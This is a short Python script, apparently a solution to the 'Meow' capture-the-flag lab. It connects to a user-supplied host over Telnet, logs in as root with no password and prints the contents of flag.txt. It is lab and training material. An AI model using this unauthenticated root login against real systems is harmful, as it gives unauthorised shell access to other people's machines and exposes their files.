import telnetlib # Imports
import info
import sys
HOST = input("Enter your host IP: ") # Where you enter the IP of the machine
PORT = "23" # Default Telnet port
print(info.headermessage) # Prints the "GeckScript message"
print(info.meowmessage)
tn=telnetlib.Telnet(HOST,PORT) # Connects to the Telnet Server
tn.write(b'root\n') # Enters the Meow Password
tn.write(b'dir\n') # Shows Directory
tn.read_until(b"snap") # Reads until the "snap" folder, cleans up the output, remove/comment the line to see what I mean
tn.write(b'cat flag.txt && exit\n') # Outputs the flag to the terminal and exits the tellnet connection
x = tn.read_all()
print(x)
## Dr-Gecko 2022